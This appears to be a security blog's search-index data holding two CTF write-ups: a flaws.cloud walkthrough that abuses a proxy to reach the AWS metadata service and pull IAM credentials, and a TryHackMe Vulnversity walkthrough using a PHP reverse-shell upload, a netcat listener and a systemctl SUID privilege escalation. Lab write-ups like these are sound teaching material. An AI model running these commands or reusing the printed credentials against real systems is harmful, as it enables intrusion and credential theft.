Here are some examples of it\u0026rsquo;s usage:\n http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/ http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/  See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it.\nNeed a hint? Go to Hint 1\nwe have level 6 url, while try to access we can see that Access Denied because level 6 is hosted on sub directory for that we need to play level 5 properly\n before that we already know what is APIPA  ip , while computer starts our computer waits less then 6 seconds for DHCP response. if DHCP server isn’t reachable. then the computer automatically assign ip with in the range of APIPA (169.254.0.1 to 169.254.255.254)\naws uses one of the ip address from APIPA range 169.254.169.254 for Retrieve instance metadata \nif we click the first link which they given\n1  [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/)   according to aws documentation only access instance metadata and user data from within the instance itself, the data is not protected by authentication or cryptographic methods. Anyone who has direct access to the instance, and potentially any software running on the instance, can view its metadata. Therefore, you should not store sensitive data, such as passwords or long-lived encryption keys, as user data.\nusing metadata service ip lets try to fetch some information about target instance\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  buntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/ 1.0 2007-01-19 2007-03-01 2007-08-29 2007-10-10 2007-12-15 2008-02-01 2008-09-01 2009-04-04 2011-01-01 2011-05-01 2012-01-12 2014-02-25 2014-11-05 2015-10-20 2016-04-19 2016-06-30 2016-09-02 2018-03-28 2018-08-17 2018-09-24 2019-10-01 2020-10-27 2021-01-03 2021-03-23 2021-07-15   after searching some suspicious directory we have found aws key\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  latestubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/ dynamic meta-data user-dataubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/ ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hostname iam/ identity-credentials/ instance-action instance-id instance-life-cycle instance-type local-hostname local-ipv4 mac metrics/ network/ placement/ profile public-hostname public-ipv4 public-keys/ reservation-id security-groups services/ubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam info security-credentials/ubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials\\ \u0026gt; ^C ubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials flawsubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/ { \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2022-05-24T12:58:01Z\u0026#34;, \u0026#34;Type\u0026#34; : \u0026#34;AWS-HMAC\u0026#34;, \u0026#34;AccessKeyId\u0026#34; : \u0026#34;ASIA6GG7PSQGQ7TEPAVL\u0026#34;, \u0026#34;SecretAccessKey\u0026#34; : \u0026#34;AV94C6SrOv16H1vbsrHmCu/pEVWBCuWtGT+Pgmjf\u0026#34;, \u0026#34;Token\u0026#34; : \u0026#34;IQoJb3JpZ2luX2VjEI3//////////wEaCXVzLXdlc3QtMiJIMEYCIQCEqt7ihjFqIL+clfFUGVUlUXq48ls5oFSAcwDO/NA2HQIhAJCVag13eXa2OdxHgsPlD7amM78frrg/sEIDPnYU3ChgKtIECHYQAhoMOTc1NDI2MjYyMDI5IgwcJjgItcBGb+d12xAqrwT+ir31XEYJuCr7JuNOrdFRRoSGo2ptgTHwa9v+c7Fq9FqzRxkvLiIflOFi3lqRJDnqVcU5K4vPedazvmaxNuB6SAg1B/Ky2pxo6krK3HpASIDjsqLUBrWOd5xqV4aLMVtQWtEX7+E7jsnSb/7hF3fctAh6isKKmkiyoIFi4WlZSiB5Pw4AOtisQEb+HHJ3/8gldY00jXLww1uK+i98/SJ6tkVSfv7K0VtL/0Ca1T1SUax8rBewKUWG5lAi/ayezhR4gQp8KJ7/Z+u+1Stet+HbNDgt9rEE7Cn4lQ+olRZFg31hiGckdiXBh3w6T0vdReh0ZYRqrlsO+3qZUeYzLM28aRFW54A6olsixnzzFABbeZ+v7CM90CNSAYIxE3hnf8QJsr41kK8a2thYgZKJs1wMIVE4DWb4ApiJ6rBL6uh7wDGuMAlrfBCoXcKpPnYfIDFmnM3p2f9Tut8S6l8DuYYzPYSd5d85rtDl9EJ+7kzcdqtZmVB5K39ZQTmYnIPRn5AVldwx9X0MNt0Pm0FDa5qQHBIH7m29SaQPr9oif6r6KyiRX+hHMCzO8Pw3clRIeeKJ8q30GKB0oSYUMOrsVuEqyGlczGsVPccXct0CzVkMGNW7LPeqioPZuKSl9CyKELVRgkSJKArR/f0zSfCAv6libMFDb34ddZP7LExGRjBwxVek02ROB22aHcOYUmp8WbBCzgdA4efaCB4/IMPzNPrazkewU/2aJ7Q/S9QN6wnNMKKss5QGOqgBaBx1ekIlITawdZ3PLRy7Ab+bLcFQq+EoUsA1yK+p7kPq9pdYSWxspq/F39hw+h+B0wUlfuSwO6STNGfUOHXnM0Ud0F/5fqCJoK9RrqpeXqtp/wkWygP4sR5pHy5zjJMO+0BLZmoNi0ISE+2o5ATOIaK8WHBCPlxJfGfsmE3OXjhPF3tK+v9zQJIvjGBDOcFNkYtSpD97xVXoe/f+SoqW2eSre8LijWLN\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2022-05-24T18:58:22Z\u0026#34; }ubuntu@ubuntu-2204:~/Desktop$   lets we configure profile using this credentials\n 💡 configure aws_session_token in **credentials** file which is located under ~/.aws/  1 2 3 4 5 6  [level6] aws_access_key_id = ASIA6GG7PSQGQ7TEPAV aws_secret_access_key = AV94C6SrOv16H1vbsrHmCu/pEVWBCuWtGT+Pgmjf aws_session_token = IQoJb3JpZ2luX2VjEI3//////////wEaCXVzLXdlc3QtMiJIMEYCIQCEqt7ihjFqIL+clfFUGVUlUXq48ls5oFSAcwDO/NA2HQIhAJCVag13eXa2OdxHgsPlD7amM78frrg/sEIDPnYU3ChgKtIECHYQAhoMOTc1NDI2MjYyMDI5IgwcJjgItcBGb+d12xAqrwT+ir31XEYJuCr7JuNOrdFRRoSGo2ptgTHwa9v+c7Fq9FqzRxkvLiIflOFi3lqRJDnqVcU5K4vPedazvmaxNuB6SAg1B/Ky2pxo6krK3HpASIDjsqLUBrWOd5xqV4aLMVtQWtEX7+E7jsnSb/7hF3fctAh6isKKmkiyoIFi4WlZSiB5Pw4AOtisQEb+HHJ3/8gldY00jXLww1uK+i98/SJ6tkVSfv7K0VtL/0Ca1T1SUax8rBewKUWG5lAi/ayezhR4gQp8KJ7/Z+u+1Stet+HbNDgt9rEE7Cn4lQ+olRZFg31hiGckdiXBh3w6T0vdReh0ZYRqrlsO+3qZUeYzLM28aRFW54A6olsixnzzFABbeZ+v7CM90CNSAYIxE3hnf8QJsr41kK8a2thYgZKJs1wMIVE4DWb4ApiJ6rBL6uh7wDGuMAlrfBCoXcKpPnYfIDFmnM3p2f9Tut8S6l8DuYYzPYSd5d85rtDl9EJ+7kzcdqtZmVB5K39ZQTmYnIPRn5AVldwx9X0MNt0Pm0FDa5qQHBIH7m29SaQPr9oif6r6KyiRX+hHMCzO8Pw3clRIeeKJ8q30GKB0oSYUMOrsVuEqyGlczGsVPccXct0CzVkMGNW7LPeqioPZuKSl9CyKELVRgkSJKArR/f0zSfCAv6libMFDb34ddZP7LExGRjBwxVek02ROB22aHcOYUmp8WbBCzgdA4efaCB4/IMPzNPrazkewU/2aJ7Q/S9QN6wnNMKKss5QGOqgBaBx1ekIlITawdZ3PLRy7Ab+bLcFQq+EoUsA1yK+p7kPq9pdYSWxspq/F39hw+h+B0wUlfuSwO6STNGfUOHXnM0Ud0F/5fqCJoK9RrqpeXqtp/wkWygP4sR5pHy5zjJMO+0BLZmoNi0ISE+2o5ATOIaK8WHBCPlxJfGfsmE3OXjhPF3tK+v9zQJIvjGBDOcFNkYtSpD97xVXoe/f+SoqW2eSre8LijWLN  ~   let us list directory using above credentials\n1 2 3 4  ubuntu@ubuntu-2204:~/.aws$ aws s3 --profile level6 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ PRE ddcc78ff/ 2017-02-26 21:11:07 871 index.html ubuntu@ubuntu-2204:~/.aws$   we have found sub directory. which helps to find level6 URL\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  ubuntu@ubuntu-2204:~/.aws$ curl http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/ \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;flAWS - Level 6\u0026lt;/title\u0026gt; \u0026lt;META NAME=\u0026#34;ROBOTS\u0026#34; CONTENT=\u0026#34;NOINDEX, NOFOLLOW\u0026#34;\u0026gt; \u0026lt;style\u0026gt; body { font-family: Andale Mono, monospace; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body text=\u0026#34;#00d000\u0026#34; bgcolor=\u0026#34;#000000\u0026#34; style=\u0026#34;max-width:800px; margin-left:auto ;margin-right:auto\u0026#34; vlink=\u0026#34;#00ff00\u0026#34; link=\u0026#34;#00ff00\u0026#34;\u0026gt; \u0026lt;center\u0026gt; \u0026lt;pre\u0026gt; _____ _ ____ __ __ _____ | || | / || |__| |/ ___/ | __|| | | o || | | ( \\_ | |_ | |___ | || | | |\\__ | | _] | || _ || ` \u0026#39; |/ \\| | | | || | | \\/ \\| |__| |_____||__|__| \\_/\\_/ \\___| \u0026lt;/pre\u0026gt; \u0026lt;h1\u0026gt;flAWS - Level 6\u0026lt;/h1\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;h3\u0026gt;Lesson learned\u0026lt;/h3\u0026gt; The IP address 169.254.169.254 is a magic IP in the cloud world. AWS, Azure, Google, DigitalOcean and others use this to allow cloud resources to find out metadata about themselves. Some, such as Google, have additional constraints on the requests, such as requiring it to use `Metadata-Flavor: Google` as an HTTP header and refusing requests with an `X-Forwarded-For` header. AWS has recently created a new IMDSv2 that requires special headers, a challenge and response, and other protections, but many AWS accounts may not have enforced it. If you can make any sort of HTTP request from an EC2 to that IP, you\u0026#39;ll likely get back information the owner would prefer you not see. \u0026lt;h4\u0026gt;Examples of this problem\u0026lt;/h4\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;https://twitter.com/Agarri_FR\u0026#34;\u0026gt;Nicolas Grégoire\u0026lt;/a\u0026gt; discovered that prezi allowed you point their servers at a URL to include as content in a slide, and this allowed you to point to 169.254.169.254 which provided the access key for the EC2 intance profile (\u0026lt;a href=\u0026#34;https://engineering.prezi.com/prezi-got-pwned-a-tale-of-responsible-disclosure-ccdc71bb6dd1?gi=c0ec39b6236a\u0026#34;\u0026gt;link\u0026lt;/a\u0026gt;). He also found issues with access to that magic IP with \u0026lt;a href=\u0026#34;https://hackerone.com/reports/53088\u0026#34;\u0026gt;Phabricator\u0026lt;/a\u0026gt; and \u0026lt;a href=\u0026#34;https://hackerone.com/reports/53004\u0026#34;\u0026gt;Coinbase\u0026lt;/a\u0026gt;. \u0026lt;/ul\u0026gt; A similar problem to getting access to the IAM profile\u0026#39;s access keys is access to the EC2\u0026#39;s user-data, which people sometimes use to pass secrets to the EC2 such as API keys or credentials. \u0026lt;h3\u0026gt;Avoiding this mistake\u0026lt;/h3\u0026gt; Ensure your applications do not allow access to 169.254.169.254 or any local and private IP ranges. Additionally, ensure that IAM roles are restricted as much as possible. \u0026lt;hr size=3 color=\u0026#34;#00d000\u0026#34; /\u0026gt; \u0026lt;h1\u0026gt;Level 6\u0026lt;/h1\u0026gt; For this final challenge, you\u0026#39;re getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account. \u0026lt;p\u0026gt;Access key ID: AKIAJFQ6E7BY57Q3OBGA\u0026lt;br\u0026gt; Secret: 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\u0026lt;br\u0026gt; \u0026lt;p\u0026gt;Need a hint? Go to \u0026lt;a href=\u0026#34;./hint1.html\u0026#34;\u0026gt;Hint 1\u0026lt;/a\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;ubuntu@ubuntu-2204:~/.aws$   we got level 6 access keys\nlets we move into Level 6\n","description":"flAWS.cloud is a set of CTF-like challenges that teach you common security issues in AWS accounts. The game is about breaking into a real AWS account by exploiting badly crafted account permissions. It has 6 levels.","id":5,"section":"posts","tags":["aws-cli","git","s3"],"title":"Flaws.cloud - AWS Security practice","uri":"https://fromzerotoonee.github.io/en/posts/flawscloud/"},{"content":"Road Map  Kill Chain Summary Vulnversiy is the first box towards offensive security path. we found web portal running on port 3333 using gobuster we found some directory\u0026rsquo;s, which helps To upload our shell codes. with help of securifera github page we can able to identify correct file extension, gained user shell using weevely and escalated privilege using SUID bit binary with help of Gtfobins.\nInfo Table   Title Vulnversity    Description Learn about active recon, web app attacks and privilege escalation.    Difficulty Easy   Maker Try Hack Me    Reconnaissance 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  $ nmap -sV 10.10.8.53 Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-28 15:35 IST Nmap scan report for 10.10.8.53 Host is up (0.30s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 66.94 seconds   The result of nmap scan makes port 3333 interest because. service HTTP belongs to port 80. lets dig port 3333\n directory search lets do directory search and identify if any sensitive directory are exposed\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  $gobuster dir -u http://10.10.1.215:3333 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.1.215:3333 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/28 23:29:54 Starting gobuster in directory enumeration mode =============================================================== /.hta (Status: 403) [Size: 292] /.htaccess (Status: 403) [Size: 297] /.htpasswd (Status: 403) [Size: 297] /css (Status: 301) [Size: 315] [--\u0026gt; http://10.10.1.215:3333/css/] /fonts (Status: 301) [Size: 317] [--\u0026gt; http://10.10.1.215:3333/fonts/] /images (Status: 301) [Size: 318] [--\u0026gt; http://10.10.1.215:3333/images/] /index.html (Status: 200) [Size: 33014] /internal (Status: 301) [Size: 320] [--\u0026gt; http://10.10.1.215:3333/internal/] /js (Status: 301) [Size: 314] [--\u0026gt; http://10.10.1.215:3333/js/] /server-status (Status: 403) [Size: 301] =============================================================== 2022/04/28 23:31:55 Finished ===============================================================    here there is a place to upload file, lets try to upload reverse shell file, in kali /usr/share/webshells/php/ directory we have set of php shell payloads. just modify attacker ip and port and upload\nbut why php shell ? PHP is one of the widely used languages for web development (more than 60%) which makes it one of the most targeted ones\nReverse shell 1  $vim /usr/share/webshells/php/php-reverse-shell.php    upload the php reverse shell\n we notice that .php extension is not allowed to upload, lets try to bypass or find right extension to upload\n we need list of extension file we will use securifera filename extension file which is available on his github page\n make sure that you need to untuck url encoding which is available under Payload Encoding\n after our payload has been uploaded, we need to find right directory ware our payload has been uploaded, again we will use directory search each suspicious directory\n we finded uploads directory and it holds our payload, before accessing payload file, make sure netcat listen on port which has configured on payload\nInitial FootHold 1 2 3 4 5 6 7 8 9 10 11 12 13  ┌─[atomloop@atomloop-virtualbox]─[~] └──_ $sudo nc -lvnp 8181 [sudo] password for atomloop: listening on [any] 8181 ... connect to [10.18.105.26] from (UNKNOWN) [10.10.25.213] 37564 Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 05:48:30 up 1:40, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ whoami www-data $   yes, we got our initial foot hold, lets try to esculate privilege, lets list any SUID files\nSUID files 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  $ sudo -l sudo: no tty present and no askpass program specified $ find / -perm -u=s 2\u0026gt;/dev/null /usr/bin/newuidmap /usr/bin/chfn /usr/bin/newgidmap /usr/bin/sudo /usr/bin/chsh /usr/bin/passwd /usr/bin/pkexec /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/at /usr/lib/snapd/snap-confine /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/squid/pinger /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /bin/su /bin/ntfs-3g /bin/mount /bin/ping6 /bin/umount /bin/systemctl /bin/ping /bin/fusermount /sbin/mount.cifs   GTFOBins is a collection of Unix binaries that can be used to bypass local security restrictions in misconfigured systems\n1 2 3 4 5 6 7 8 9  TempFile=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;chmod +s /bin/bash\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TempFile /bin/systemctl link $TempFile /bin/systemctl enable --now $TempFile /bin/bash -p   we have given suid permission to /bin/bash which can allow us to run bash as root.\nSystemctl is the tool used to control the systemd init service. systemd is a Linux initialization system and service manager that includes features like on-demand starting of daemons, mount and automount point maintenance, snapshot support, and processes tracking using Linux control groups. systemd provides a logging daemon and other tools and utilities to help with common system administration tasks.\nTempFile=$(mktemp).service - we are creating an environment variable called “TempFile” (you can call it whatever you want). Within that variable we are calling the mktemp command to create a temporary file as a systemd service unit file (the “.service” part at the end)\nTempFile=$(mktemp).service the config we need our unit file to execute.\n[Service] ExecStart=/bin/sh -c \u0026#34;chmod +s /bin/bash\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TempFile The problem is that our current logged-in user does not have permission to write to /etc/systemd/system where this would normally go. We get around that by echoing our unit file one line at a time into the env variable we just created.\necho ‘[Service] - calls the echo command to start echoing the input (notice the single quote? By not including the second single quote to close the line we are able to enter multiple single line inputs and complete our systemd unit file)\n[Service] - the first part of our unit file\nExecStart=/bin/sh -c “chmod +s /bin/bash” - when the service starts call the default system shell (the -c tells the shell to execute everything inside the quotes),\nwe have given suid permission to /bin/bash which can allow us to run bash as root.\n[Install] - the second part of our unit file\nWantedBy=multi-user.target’ \u0026gt; $TempFile- sets the state (or run level) at which this service will run (notice the closing single quote?), the \u0026gt; directs all our inputs to the TempFile env variable\n/bin/systemctl link $TempFile - per the systemctl man page, this makes our unit file available for systemctl commands even though it is outside of the standard search paths\n/bin/systemctl enable —now $TempFile - “…Enable one or more units or unit instances. This will create a set of symlinks, as encoded in the \u0026quot;[Install]\u0026quot; sections of the indicated unit files. After the symlinks have been created, the system manager configuration is reloaded (in a way equivalent to daemon-reload), in order to ensure the changes are taken into account immediately. Note that this does not have the effect of also starting any of the units being enabled. If this is desired, combine this command with the --now switch…”\nRoot shell └──_ #nc -lvnp 8181 listening on [any] 8181 ... connect to [10.18.105.26] from (UNKNOWN) [10.10.240.190] 60678 Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 21:38:51 up 26 min, 0 users, load average: 0.00, 0.00, 0.02 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ TempFile=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;chmod +s /bin/bash\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TempFile /bin/systemctl link $TempFile /bin/systemctl enable --now $TempFile /bin/bash -p$ \u0026gt; \u0026gt; \u0026gt; \u0026gt; $ Created symlink from /etc/systemd/system/tmp.xB76fAiWD8.service to /tmp/tmp.xB76fAiWD8.service. $ Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.xB76fAiWD8.service to /tmp/tmp.xB76fAiWD8.service. $ /bin/bash -p whoami root See You on the next Blog, Happy Hacking\n","description":"vulnversiy  was the first box towards offensive security path. we found web portal running on port 3333 using gobuster we found some  directory's,  which helps To upload our shell codes. with help of  securifera github page we can able to identify correct file  extension, gained user shell using php-reverse-shell and escalated privilege using SUID bit binary with help of Gtfobins.","id":6,"section":"posts","tags":["suid","systemctl"],"title":"Try Hack Me - Vulnversity","uri":"https://fromzerotoonee.github.io/en/posts/vulnversity/"},{"content":"Hi all, Welcome to my blog, I am Atom cyber security analyst(pen tester, ctf player). here you can able to find writeups of (Try Hack Me, Vulnhub, Hack The Box and CTFs) in the level of beginner\n","description":"Hugo, the world’s fastest framework for building websites","id":11,"section":"","tags":null,"title":"About","uri":"https://fromzerotoonee.github.io/en/about/"}]